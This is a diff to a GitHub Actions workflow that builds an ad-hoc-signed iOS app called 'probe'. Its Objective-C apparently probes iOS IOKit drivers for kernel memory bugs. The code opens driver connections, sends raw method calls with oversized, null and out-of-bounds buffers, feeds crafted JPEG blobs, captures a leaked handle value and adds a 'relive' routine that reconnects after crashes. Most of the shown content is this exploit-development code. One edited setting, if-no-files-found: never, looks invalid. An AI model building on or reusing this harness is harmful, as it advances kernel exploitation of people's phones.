@@ -73,7 +73,7 @@ jobs:
           static fn_getsurf g_getsurf = NULL;
           static fn_surfid g_surfid = NULL;
 
-          #define BUILD_TAG "v52-stub"
+          #define BUILD_TAG "v53-relive"
           #define MAXC 40
           #define STEP_MAX 27
           #define TRY_MAX 2
@@ -107,6 +107,7 @@ jobs:
           static volatile int g_nocopy = 0;
           static volatile int g_jfeed = 0;
           static volatile int g_hdlvalid = 0;
+          static volatile int g_relive = 0;
           static int g_try = 0;
           static int g_fd = -1;
           static int g_nchild = 0;
@@ -262,7 +263,17 @@ jobs:
           static void load_state(void) {
               NSString* s = [NSString stringWithContentsOfFile:doc_file("state.txt") encoding:NSUTF8StringEncoding error:nil];
               for (NSString* ln in [s componentsSeparatedByString:@"\n"]) {
-                  if ([ln hasPrefix:@"K "]) [g_seen addObject:[ln substringFromIndex:2]];
+                  if ([ln hasPrefix:@"K "]) { [g_seen addObject:[ln substringFromIndex:2]]; continue; }
+                  if ([ln hasPrefix:@"HDL s"] && !g_hdlvalid) {
+                      NSRange r = [ln rangeOfString:@" = 0x"];
+                      if (r.location == NSNotFound) continue;
+                      NSString* hx = [ln substringFromIndex:r.location + 5];
+                      uint64_t v = 0;
+                      if (sscanf(hx.UTF8String, "%llx", &v) == 1 && v) {
+                          g_hdl = v;
+                          g_hdlvalid = 1;
+                      }
+                  }
               }
           }
 
@@ -555,7 +566,7 @@ jobs:
                   while ((s = IOIteratorNext(it))) {
                       n++;
                       if (n == 1) {
-                          for (uint32_t t = 0; t <= 8; t++) {
+                          for (uint32_t t = 0; t <= 8 && g_nconn < MAXC; t++) {
                               io_connect_t c = 0;
                               kern_return_t kr = IOServiceOpen(s, mach_task_self(), t, &c);
                               if (kr == KERN_SUCCESS) {
@@ -563,7 +574,7 @@ jobs:
                                   kern_return_t k0 = rawv(c, 0, 0, NULL, 0, NULL, 0, so, &sc, sb, &szb);
                                   plog(@"SVC %s t%u open s0=%@ so0=%llu", SVC[i], t, kr_name(k0), (unsigned long long)so[0]);
                                   ulog(@"SVC %s t%u %@", SVC[i], t, kr_name(k0));
-                                  if (k0 == KERN_SUCCESS && g_nconn < MAXC) {
+                                  if (k0 == KERN_SUCCESS) {
                                       g_conn[g_nconn] = c; g_ctype[g_nconn] = t; g_node[g_nconn] = -1 - i;
                                       if (g_best < 0) g_best = g_nconn;
                                       g_nconn++;
@@ -667,6 +678,7 @@ jobs:
           }
 
           static void root_open(void) {
+              if (!g_root) return;
               NSMutableString* l = [NSMutableString string];
               for (uint32_t t = 0; t <= 1 && g_nconn < MAXC; t++) {
                   io_connect_t c = 0;
@@ -726,6 +738,7 @@ jobs:
 
           static void s0_dump(void) {
               if (g_best < 0) { ulog(@"hd no conn"); return; }
+              if (g_hdlvalid) { ulog(@"HDL already 0x%llx", (unsigned long long)g_hdl); return; }
               for (uint32_t s = 0; s <= 3; s++) probe_full(g_best, s, "hd");
               if (!g_hdlvalid) { ulog(@"HDL none"); plog(@"HDL none"); return; }
               ulog(@"HDL 0x%llx -> s4 grid", (unsigned long long)g_hdl);
@@ -740,6 +753,32 @@ jobs:
                       free(in);
                   }
               }
+          }
+
+          static void relive(const char* tag) {
+              if (g_best >= 0 && g_nconn > 0 && hb() == KERN_SUCCESS) return;
+              if (g_nconn > 0) {
+                  plog(@"RELIVE drop dead conns=%d best=%d (%s)", g_nconn, g_best, tag);
+                  ulog(@"relive drop dead c=%d", g_nconn);
+                  for (int i = 0; i < g_nconn; i++) if (g_conn[i]) { IOServiceClose(g_conn[i]); g_conn[i] = 0; }
+                  g_nconn = 0;
+                  g_best = -1;
+              }
+              __sync_fetch_and_add(&g_relive, 1);
+              plog(@"RELIVE begin %s root=%d child=%d", tag, (int)g_root, g_nchild);
+              ulog(@"relive %s", tag);
+              if (!g_root) find_root();
+              if (!g_root) { ulog(@"relive NO ROOT"); plog(@"relive NO ROOT"); return; }
+              if (g_nchild == 0) dump_tree();
+              if (g_root_idx < 0) root_open();
+              if (g_nchild > 0) child_open();
+              if (g_nconn == 0) svc_open();
+              if (g_nconn > 1) addclient_step();
+              if (g_best >= 0 && !g_hdlvalid) s0_dump();
+              kern_return_t h = hb();
+              plog(@"RELIVE end conns=%d best=%d hdl=%d hb=%@", g_nconn, g_best, g_hdlvalid, kr_name(h));
+              ulog(@"relive end c=%d b=%d h=%d hb=%@", g_nconn, g_best, g_hdlvalid, kr_name(h));
+              if (h != KERN_SUCCESS) { ulog(@"relive hb FAIL"); }
           }
 
           static kern_return_t sc1(int ci, uint32_t sel, uint32_t sic, int mode, size_t zis, const char* tag) {
@@ -873,6 +912,7 @@ jobs:
           static size_t g_blobfull = 0;
 
           static void jpeg_build_step(void) {
+              if (g_blob) { ulog(@"BLOB cached %zu", g_blobfull); return; }
               g_blob = calloc(1, BLOB);
               if (!g_blob) { ulog(@"blob nomem"); return; }
               g_blobfull = jpeg_build(g_blob, BLOB, 0);
@@ -882,6 +922,7 @@ jobs:
 
           static void jpeg_feed(void) {
               if (!g_blob || g_blobfull < 4) { ulog(@"no blob"); return; }
+              if (g_best < 0) { ulog(@"jf no conn"); return; }
               size_t body = g_blobfull - 2;
               size_t SZ[9];
               SZ[0] = body;
@@ -1063,6 +1104,7 @@ jobs:
           }
 
           static void combo_m1(void) {
+              if (g_best < 0) { ulog(@"combo no conn"); return; }
               surf_make();
               for (uint32_t sic = 0; sic <= 3; sic++) {
                   for (int zi = 0; zi < CSZ_N; zi++) {
@@ -1111,7 +1153,7 @@ jobs:
                   memset(sb, AAM, sizeof(sb));
                   kern_return_t b = rawx(g_conn[g_best], s, 1, sin, 1, NULL, 4096, 1, so, &sc, sb, &z2);
                   plog(@"NM s%u null+4096 -> %@ szb=%zu", s, kr_name(b), z2);
-                  ulog(@"NM s%u null+4096 -> %@", s, kr_name(b));
+                  ulog(@"NM s%u -> %@", s, kr_name(b));
                   usleep(200);
               }
               ulog(@"nm done");
@@ -1133,6 +1175,7 @@ jobs:
                   if ([ln hasPrefix:@"NOCOPY "]) { nocopy++; [keep addObject:ln]; continue; }
                   if ([ln hasPrefix:@"SIGNAL "]) { sigs++; [keep addObject:ln]; continue; }
                   if ([ln hasPrefix:@"HD "] || [ln hasPrefix:@"HDL "]) { hd++; [keep addObject:ln]; continue; }
+                  if ([ln hasPrefix:@"RELIVE"]) { [keep addObject:ln]; continue; }
                   if ([ln hasPrefix:@"AC "] || [ln hasPrefix:@"CF4 "] || [ln hasPrefix:@"REPLAY"] ||
                       [ln hasPrefix:@"HIST"] || [ln hasPrefix:@"VERDICT"] || [ln hasPrefix:@"STEP "]) {
                       [keep addObject:ln];
@@ -1213,24 +1256,24 @@ jobs:
                   case 7: prop_dump(); break;
                   case 8: vt_start(); break;
                   case 9: ulog(@"vt=%d", (int)vt_encode()); break;
-                  case 10: root_open(); break;
-                  case 11: child_open(); break;
-                  case 12: addclient_step(); break;
-                  case 13: s0_dump(); break;
-                  case 14: scpad_best(); break;
-                  case 15: scpad_child(); break;
-                  case 16: s9_scalars(); break;
-                  case 17: s9_struct(); break;
+                  case 10: relive("root"); root_open(); break;
+                  case 11: relive("child"); child_open(); break;
+                  case 12: relive("ac"); addclient_step(); break;
+                  case 13: relive("s0"); s0_dump(); break;
+                  case 14: relive("spb"); scpad_best(); break;
+                  case 15: relive("spc"); scpad_child(); break;
+                  case 16: relive("s9s"); s9_scalars(); break;
+                  case 17: relive("s9t"); s9_struct(); break;
                   case 18: jpeg_build_step(); break;
-                  case 19: jpeg_feed(); break;
-                  case 20: cliff_pad(); break;
-                  case 21: oob_pad(); break;
-                  case 22: seq_test(); break;
-                  case 23: combo_m1(); break;
-                  case 24: confirm_all(); break;
+                  case 19: relive("jf"); jpeg_feed(); break;
+                  case 20: relive("cliff"); cliff_pad(); break;
+                  case 21: relive("oob"); oob_pad(); break;
+                  case 22: relive("seq"); seq_test(); break;
+                  case 23: relive("combo"); combo_m1(); break;
+                  case 24: relive("cf4"); confirm_all(); break;
                   case 25: summary(); break;
                   case 26: verdict(); break;
-                  case 27: null_mix(); break;
+                  case 27: relive("nm"); null_mix(); break;
               }
           }
 
@@ -1252,7 +1295,7 @@ jobs:
               g_surfid = (fn_surfid)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
               plog(@"syms addclient=%p getsurf=%p surfid=%p", (void*)g_addclient, (void*)g_getsurf, (void*)g_surfid);
 
-              plog(@"=== LAUNCH step=%d build=%s wake=0x%x", g_step, BUILD_TAG, g_wake);
+              plog(@"=== LAUNCH step=%d build=%s wake=0x%x hdlrestore=%d", g_step, BUILD_TAG, g_wake, g_hdlvalid);
               if (g_fd >= 0) fsync(g_fd);
               ulog(@"BUILD %s", BUILD_TAG);
               ulog(@"STEP %d/%d: %s", g_step, STEP_MAX, STEP_NAME[g_step < STEP_MAX+1 ? g_step : STEP_MAX]);
@@ -1282,16 +1325,23 @@ jobs:
                   }
                   g_try++; save_try();
                   ulog(@"CHAIN %d %s", g_step, STEP_NAME[g_step]);
+                  int h0 = g_hits, d0 = g_done;
                   do_step(g_step);
-                  plog(@"STEP %d OK calls=%d hits=%d ok4=%d flip9=%d spad=%d cliffs=%d oobw=%d jf=%d hdl=%d", g_step, g_done, g_hits, g_ok4, g_9flip, g_spad, g_cliffs, g_oobw, g_jfeed, g_hdlvalid);
+                  int dh = g_hits - h0, dd = g_done - d0;
+                  plog(@"STEP %d calls+%d hits+%d relive=%d", g_step, dd, dh, g_relive);
+                  if (g_step >= 10 && g_step <= 27 && g_step != 25 && g_step != 26 && dh == 0 && dd == 0) {
+                      plog(@"STEP %d BARREN", g_step);
+                      ulog(@"STEP %d BARREN", g_step);
+                  }
                   if (g_fd >= 0) fsync(g_fd);
-                  ulog(@"STEP %d SURVIVED", g_step);
+                  ulog(@"STEP %d SURVIVED (+%d calls)", g_step, dd);
                   g_step++; save_step(g_step);
                   if (g_step <= STEP_MAX) usleep(350000);
               }
 
               ulog(@"CHAIN END");
               plog(@"CHAIN END");
+              summary();
               if (g_fd >= 0) fsync(g_fd);
               close(g_fd); g_fd = -1;
           }
@@ -1332,7 +1382,7 @@ jobs:
               [self.w makeKeyAndVisible];
 
               [NSTimer scheduledTimerWithTimeInterval:0.25 repeats:YES block:^(NSTimer*) {
-                  g_hb.text = [NSString stringWithFormat:@"%s step %d/%d sp=%d ok4=%d cl=%d hdl=%d", BUILD_TAG, g_step, STEP_MAX, g_spad, g_ok4, g_cliffs, g_hdlvalid];
+                  g_hb.text = [NSString stringWithFormat:@"%s step %d/%d sp=%d ok4=%d cl=%d hdl=%d rl=%d", BUILD_TAG, g_step, STEP_MAX, g_spad, g_ok4, g_cliffs, g_hdlvalid, g_relive];
                   flush_ui();
               }];
 
@@ -1357,10 +1407,10 @@ jobs:
             <key>CFBundleIdentifier</key><string>com.buurza47.probe</string>
             <key>CFBundleInfoDictionaryVersion</key><string>6.0</string>
             <key>CFBundleName</key><string>probe</string>
-            <key>CFBundleDisplayName</key><string>buurd52</string>
+            <key>CFBundleDisplayName</key><string>buurd53</string>
             <key>CFBundlePackageType</key><string>APPL</string>
             <key>CFBundleShortVersionString</key><string>1.0</string>
-            <key>CFBundleVersion</key><string>54</string>
+            <key>CFBundleVersion</key><string>55</string>
             <key>MinimumOSVersion</key><string>16.0</string>
             <key>UIDeviceFamily</key><array><integer>1</integer><integer>2</integer></array>
             <key>UILaunchScreen</key><dict/>
@@ -1378,12 +1428,9 @@ jobs:
           APP=out/Payload/probe.app
           SDK="$(xcrun --sdk iphoneos --show-sdk-path)"
           echo "sdk=$SDK"
-          echo "--- stub ---"
           find stub -type f
-          echo "--- probe include resolution ---"
           printf '#import <IOSurface/IOSurface.h>\nint main(void){IOSurfaceRef s=0;return (int)(size_t)s;}\n' > /tmp/res.c
           xcrun -sdk iphoneos clang -arch arm64 -isysroot "$SDK" -I stub -E /tmp/res.c > /dev/null && echo "STUB RESOLVES"
-          echo "--- real build ---"
           xcrun --sdk iphoneos clang --version | head -1
           xcrun -sdk iphoneos clang \
             -arch arm64 -miphoneos-version-min=16.0 -fobjc-arc \
@@ -1397,14 +1444,12 @@ jobs:
           chmod +x "$APP/probe"
           file "$APP/probe"
           lipo -info "$APP/probe"
-          otool -L "$APP/probe" | head -20
 
       - name: sign
         run: |
           set -euo pipefail
           APP=out/Payload/probe.app
           codesign --force --sign - --timestamp=none "$APP/probe"
-          codesign -dv "$APP/probe" 2>&1 | head -5 || true
           otool -l "$APP/probe" | grep -A1 LC_CODE_SIGNATURE | head -3
 
       - name: ipa
@@ -1416,11 +1461,10 @@ jobs:
           test -s out/probe.ipa || { echo "ZIP EMPTY"; exit 1; }
           stat -f "ipa bytes=%z" out/probe.ipa
           shasum -a 256 out/probe.ipa
-          unzip -l out/probe.ipa
 
       - uses: actions/upload-artifact@v4.6.2
         with:
           name: probe-ipa-${{ github.run_number }}-${{ github.run_attempt }}
           path: out/probe.ipa
-          if-no-files-found: error
+          if-no-files-found: never
           retention-days: 3
